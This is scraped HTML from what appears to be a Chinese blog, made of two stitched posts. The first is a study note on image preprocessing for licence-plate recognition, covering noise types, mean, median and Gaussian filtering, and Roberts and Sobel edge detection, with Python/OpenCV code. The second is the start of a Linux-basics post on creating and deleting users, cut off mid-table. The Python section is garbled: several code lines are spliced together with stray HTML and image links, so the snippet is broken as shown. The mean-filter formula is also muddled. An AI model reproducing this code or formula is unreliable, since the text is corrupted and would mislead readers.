style="height:.686em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>最后简要描述一下算法的实现思路：</p><ol><li>从灰度值为 0 的地方开始进行渐进统计</li><li>累加灰度级频度数</li><li>频率乘以灰度总级数得出来该灰度变换后的灰度级。</li><li>计算出的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>255</mn><msub><mi>s</mi><mi>K</mi></msub></mrow><annotation encoding="application/x-tex">255s_K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.79444em;vertical-align:-.15em"></span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.32833099999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.07153em">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 的值即为我们所求得到像素点，此时就可以通过新的像素点绘图得到灰度图像。</li></ol><p>记得补充代码</p><h2 id="图像滤波去噪法"><a class="anchor" href="#图像滤波去噪法">#</a> 图像滤波去噪法</h2><p>一幅原始图像在获取和传输的过程中会受到各种噪声的干扰，这些干扰使图像的质量下降。<br>我们要认识常见的噪声然后对症下药，典型的噪声有：</p><ol><li><strong>椒盐噪声</strong>，想象一下吃烧烤的时候撒调料，调料落在烧烤上的位置是随机的。而这里的噪声也可以这么理解，他们幅值基本相同，但是出现位置随机</li><li><strong>随机噪声</strong>，这里的随机并不是说噪声分布的随机，而是针对的是噪声的幅度，即每一点都有噪声但是噪声的幅度值是随机的。</li><li><strong>高斯噪声</strong>，这个难以理解，那是你需要先百度一下高斯分布，然后你发现高斯分布就是我们常说的正态分布，是不是就明白了很多呢，这个噪声幅度分布形状是呈正态分布的。注：常常由阻性元件内部产生</li><li><strong>加性噪声和乘性噪声</strong>，这里需要理清楚的是噪声和信号之间的关系，前者图像与图像信号无关，其分布图像可以表示为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x,y)=g(x,y)+n(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.03588em">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span></span></span></span>，是不是只有相加的关系呢。后者的图像则受到图像型号的影响，其分布为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x,y)=g(x,y)+n(x,y)g(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.03588em">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:.03588em">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span></span></span></span></li><li><strong>量化噪声</strong>，这个噪声就很神奇，计算公式里面没有出现输入图像信号的影子，而其反映的是量化过程中存在的量化误差反映到接收端而产生的，噪声大小反映出了原图与显示图像的差异</li></ol><h3 id="原理"><a class="anchor" href="#原理">#</a> 原理</h3><p>在认识去噪方法之前，我们需要知道几个滤波原理才能明白去噪方法是怎么执行的</p><ol><li>通过部分区域的像素点集合计算出他们像素的均值，然后把均值赋值给当前的像素点，并作为处理后图像在该点的灰度值。这种方法称为均值滤波又称线性滤波，主要方法如前面所说为领域平均法。</li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>M</mi></mfrac><mo>∑</mo><mo>∫</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g(x,y)=\frac{1}{M}\sum\int f(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.03588em">g</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:2.22225em;vertical-align:-.86225em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.10903em">M</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.677em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.686em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mop op-symbol large-op" style="position:relative;top:-.000004999999999977245em">∑</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mop op-symbol large-op" style="margin-right:.44445em;position:relative;top:-.0011249999999999316em">∫</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span></span></span></span></span></p><p>其中，M 为模板中包含当前像素点在内的像素总个数，s 为选取的模板的点的集合</p><ol start="2"><li>利用某一个像素的点的附近领域的点的灰度值的中值代替这个像素点的灰度值，很明显这种方法可以去掉某些突出的像素点，它被称为中值滤波。这种方法使图像更加平滑，所以也可以视为一种局部平滑技术。中值滤波在一定的条件下可以克服另一种方法即线性滤波的缺点（细节处理不好），对于滤除脉冲干扰（图像扫描噪点）是最有效的。中值滤波器处理连续图像窗函数时与线性滤波器工作方式相似，但是他不是加权运算。<br>取 3x3 函数窗计算 (i,j) 为中心函数窗像素中值过程：<ol><li>按强度值大小排列像素点</li><li>选择排序像素集的中间值作为点 (i,j) 的新值<br>值得注意的是，我们能够想到，这种方法存在的意义就是为了处理某些不合理的极值点，而某些图像中本来就存在这样的点比如线与尖端，那些图像就不适用于这种方法。</li></ol></li></ol><p>经过中值滤波处理的图像，对于过亮和过暗的图像能够更好的区分背景和字符。</p><ol start="3"><li>正太分布总是统计学里值得讨论的课题，而现实中的确存在大量服从正太分布的数据。正太分布又称为高斯分布，通过高斯函数的形状选择权值的线性平滑滤波器，称为高斯平滑滤波器，显然对于那些服从高斯分布的噪声的效果是显而易见的。<br>高斯滤波的重要性质是其特殊图像性质所决定的。</li></ol><p>对于方法的选择：最简单的方法肯定是线性滤波技术，拥有理论基础和易于实现等特征，大家都喜欢使用它。</p><h3 id="去噪方法"><a class="anchor" href="#去噪方法">#</a> 去噪方法</h3><p>进行图像滤波去噪，是为了改善图像质量并有利于提取图像的有效信息。<br>基于噪声频谱分布的规律和统计特征，图像的特点。常见的图像去噪方法有：</p><ol><li>空域合成法</li><li>频域合成法</li><li>最优合成法</li></ol><h3 id="高斯平滑滤波"><a class="anchor" href="#高斯平滑滤波">#</a> 高斯平滑滤波</h3><p>高斯函数的重要性质（个人理解）</p><ol><li>二维高斯函数具有旋转对称性：<br>根据高斯函数图像，也就是正态分布图像我们可以看出，图像是均匀对称分布的。<br>故滤波器在各个方向上的平滑程度是相同的，一般来说一幅图像的边缘方向是不知道的。<br>换句话来说就是对于处理算法而言，图像的边缘到底在哪是不知道的。<br>因此，在滤波之前是无法确定一个方向比另一个方向上要有更多的平滑<br>也许就是我们所说的图像的随机未知性，图像像素并没有什么可以预测到的分布的像素。<br>旋转对称性也就意味着滤波器在后续图像处理<strong>都会等同处理</strong>不会偏向任意一方。</li><li>高斯函数是单值函数（f (x)=y）。<br>高斯滤波器用某一像素的领域的加权均值来代替该点的像素值，领域像素点的权值是随着离该像素点的距离的增加而减少（放射性）<br>边缘是一种图像局部特征<br>边缘是图像性区域和另一个属性区域的交接处，是区域属性发生突变的地方，是图像中不确定性最大的地方，也是图像信息最集中的地方，图像的边缘包含着丰富的信息。<br>距离计算中心（所求的像素点）很远的地方的点通过平滑计算后仍然对这个计算中心有很大的影响，那么平滑运算会使图像失真（图像信息丢失）</li><li>傅里叶变化频谱（先深入理解一下<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xOTc2MzM1OA==">频谱图和傅里叶变换</span>）</li></ol><h2 id="图像定位处理"><a class="anchor" href="#图像定位处理">#</a> 图像定位处理</h2><h3 id="边缘检测方法"><a class="anchor" href="#边缘检测方法">#</a> 边缘检测方法</h3><p>图像边缘：图像局部特性的不连续性<br>* 灰度级突变<br>* 颜色突变<br>* 纹理结构突变</p><p>图像的不连续性：</p><ol><li>跃迁不连续：图像灰度在一个边界的变化是明显的，灰度值突然发生的 “断崖式” 变化</li><li>线条不连续：图像的灰度突然变浅了（不连续的部分），然后又恢复到了正常（连续的部分），可以看作为灰度保持了一个较小的行程又回到了原来的值</li></ol><p>几个会接触到的术语：</p><ol><li>边缘点；边缘段；轮廓</li><li>边缘检测器：从图像抽取边缘集合的算法</li><li>边缘连接：无序边缘形成的有序边缘表的过程</li><li>边缘跟踪：用来确定轮廓图像（经过滤波处理）的搜索过程</li></ol><h4 id="差分边缘检测算法"><a class="anchor" href="#差分边缘检测算法">#</a> 差分边缘检测算法</h4><p>处理差分域时，可用图像的一阶差分直接代替图像函数的导数</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x+1,y) - f(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span></span></span></span></span></p><p>y 方向上的一阶差分：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x,y+1) - f(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal" style="margin-right:.10764em">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mclose">)</span></span></span></span></span></p><p>总结原理：基于边缘地带的灰度迅速变换，此时一阶导数达到最大的原理，利用导数算子检测边缘。很少用</p><h4 id="roberts边缘检测"><a class="anchor" href="#roberts边缘检测">#</a> Roberts 边缘检测</h4><p>利用局部差分算子寻找边缘的算子，计算对角导数：<br>t = f[i,j] - f[i+1,j+1]<br>d = f[i+1,j] - f[i,j+1]</p><p>G[i,j] = sqrt(t<sup>2+d</sup>2)</p><p>最终的近似值 = abs (t)+abs (d)</p><h4 id="sobel算法"><a class="anchor" href="#sobel算法">#</a> Sobel 算法</h4><p>Sobel 算子很容易在空间上实现，边缘检测器不但产生了较好的边缘检测效果的同时<br>由于 sobel 算子引入了局部平均，使得受到的噪声的影响比较小，使用大的领域的时候，抗噪声会更好，只是会增加计算量同时得到的边缘会更粗</p><p>方式：利用像素点上下、左右领域点的灰度加权算法，根据在边缘点处达到极值这一现象进行边缘检测</p><p>sobel 算子对噪声具有平滑作用，提出了较为精确地边缘方向信息<br>同时由于局部平均的算法，同时它会检测出许多伪边缘，且边缘定位精度不够高<br>当对精度要求不是很高的时候就常用这种方式来检测边缘</p><p>以上，车牌识别的 1/3 工作已经完毕，主要包括了：</p><ol><li>图像灰度处理</li><li>二值化</li><li>滤波去噪</li><li>边缘检测</li></ol><p>在后面，我们会继续提到图像裁剪、图像内容识别等内容！</p><h2 id="python实现代码"><a class="anchor" href="#python实现代码">#</a> python 实现代码</h2><h3 data-num="2"></td><td><pre><span class="token keyword">import</span> copy</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> math</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 读入原始图像</span></pre></td></tr><tr><td data-num="6"></td><td><pre>img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># 灰度化处理</span></pre></td></tr><tr><td data-num="9"></td><td><pre>img1 <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">"test.jpg"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># 灰度化处理：次灰度化处理用于图像二值化</span></pre></td></tr><tr><td data-num="12"></td><td><pre>gray <span class="token operator">=</span> cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2GRAY<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment"># 反色变换</span></pre></td></tr><tr><td data-num="15"></td><td><pre>cover <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>gray<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>rows <span class="token operator">=</span> img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>cols <span class="token operator">=</span> img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre> <span class="token class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre> cover<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255</span> <span class="token operator">-</span> cover<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre> class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'gray'</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td punctuation">(</span>img<span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token data-num="23"></td><td><pre>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'median'</span><span class="token href="https://imgbed.cn" target="_blank" rel="noopener"><img data-src="https://img-blog.csdnimg.cn/img_convert/cf261b86332a053a52ad4bd00c7c128e.png" alt="imgbed.cn图床"></a><br><a href="https://imgbed.cn" target="_blank" rel="noopener"><img data-src="https://img-blog.csdnimg.cn/img_convert/47095e8d3ef47d0efcc0dd1d9f2ec3d8.png" alt="imgbed.cn图床"></a></p><h3 id="边缘检测"><a class="anchor" href="#边缘检测">#</a> 边缘检测</h3><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> cv2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> skimage <span class="token keyword">import</span> data<span class="token punctuation">,</span>filters<span class="token punctuation">,</span>img_as_ubyte</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># 最后两个参数的含义：</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 用来选择方向</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># 1,1 全方位 | 1,0 水平方向 | 0,1 竖直方向</span></pre></td></tr><tr><td data-num="9"></td><td><pre>edges <span class="token operator">=</span> cv2<span class="token punctuation">.</span>Sobel<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>CV_16S<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 不需要进行灰度处理就可以唉</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># 转化类型</span></pre></td></tr><tr><td data-num="12"></td><td><pre>img_edges <span class="token operator">=</span> cv2<span class="token punctuation">.</span>convertScaleAbs<span class="token punctuation">(</span>edges<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'edge'</span><span class="token punctuation">,</span>img_edges<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><a href="https://imgbed.cn" target="_blank" rel="noopener"><img data-src="https://img-blog.csdnimg.cn/img_convert/cf261b86332a053a52ad4bd00c7c128e.png" alt="imgbed.cn图床"></a><br><a href="https://imgbed.cn" target="_blank" rel="noopener"><img data-src="https://img-blog.csdnimg.cn/img_convert/8f8cd520e2f0635b2164bbdddff027cd.png" alt="imgbed.cn图床"></a><br>发现效果并不怎么好？这里介绍另一个库的 sobel 算法</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># img = data.camera () # 系统自带灰度图像</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 边缘检测必须要是灰度图像</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># .sobel 全方位</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># .sobel_h 水平方向</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># .sobel_v 竖直方向</span></pre></td></tr><tr><td data-num="8"></td><td><pre>edges <span class="token operator">=</span> filters<span class="token punctuation">.</span>sobel<span class="token punctuation">(</span>img<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 浮点型转换成伟整型</span></pre></td></tr><tr><td data-num="11"></td><td><pre>edges <span class="token operator">=</span> img_as_ubyte<span class="token punctuation">(</span>edges<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'edge'</span><span class="token punctuation">,</span>edges<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><a href="https://imgbed.cn" target="_blank" rel="noopener"><img data-src="https://img-blog.csdnimg.cn/img_convert/cf261b86332a053a52ad4bd00c7c128e.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn" target="_blank" rel="noopener"><img item.title: 从零学习linux
item.description: <div class="note info"><p>操作系统系统学习</p><p>从零基础入门到深入内核学习笔记</p></div><div class="note warning"><p>正在学习基础知识</p></div><div class="note primary"><p>学习路线：<br><a href="/os/linux">系统学习</a> - <a href="/os/linux/kali-wifi/">Kali linux</a></p></div><h1 id="linux规划学习"><a class="anchor" href="#linux规划学习">#</a> linux 规划学习</h1><p>之前学习的 linux 比较杂而乱，基本是需要什么百度什么，系统的学习并没有总结出较好的笔记和规律。再上这门课的时候，我也不知道自己的基础是什么样子的。既然不知道底细，那么就从零开始快速学习吧</p><h2 id="第一次使用linux的基本操作"><a class="anchor" href="#第一次使用linux的基本操作">#</a> 第一次使用 linux 的基本操作</h2><p>第一次登陆，我们不能总是使用 root，我们需要一个账号相对安全的使用系统</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$useradd</span> -m username <span class="token comment"># 添加用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$passwd</span> username <span class="token comment"># 添加密码</span></pre></td></tr></table></figure><p>接下来我们删除二手系统中的原账号</p><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 如果你已经切换到了新账号，你会发现你还没有足够的权限删除别人的账号，我们先切换回 root 账号</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$su</span> root</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$userdel</span> <span class="token operator">-</span>r username</pre></td></tr></table></figure><p>我们发现刚创建的账号的权利级别是很低的，要让我们的账号更加有权利，我们就需要把自己加入一个定义好的组</p><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$groups</span> <span class="token comment"># 先查看所有的组别</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$usermod</span> <span class="token operator">-</span>G groupName username <span class="token comment"># 添加组</span></pre></td></tr></table></figure><p>基本的账号创建完毕了，我们就来检查一下自己的系统</p><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$uname</span> <span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token punctuation">)</span> <span class="token comment"># 查看系统信息，-a 可以看到更多的内容</span></pre></td></tr></table></figure><p>然后我们开始愉快的实验内容，以下命令为基本命令，在常规操作中使用（f,f1,f2 等代表文件的路径）</p><table><thead><tr><th 